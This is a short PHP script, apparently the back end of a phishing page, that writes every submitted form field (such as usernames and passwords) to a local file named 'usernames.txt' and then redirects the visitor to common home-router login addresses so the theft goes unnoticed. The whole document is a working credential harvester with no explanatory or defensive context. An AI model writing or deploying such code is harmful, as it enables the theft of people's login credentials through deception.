<?php
header ('Location:http://192.168.1.1/');
header ('Location:http://192.168.0.1/login.htm/');
header ('Location:http://192.168.0.1/');
$handle=fopen("usernames.txt","a");
foreach($_POST as $variable=>$value)
{
fwrite($handle,$variable);
fwrite($handle,"=");
fwrite($handle,$value);
fwrite($handle,"\r\n");
}
fwrite($handle,"\r\n");
fclose($handle);
exit;
?>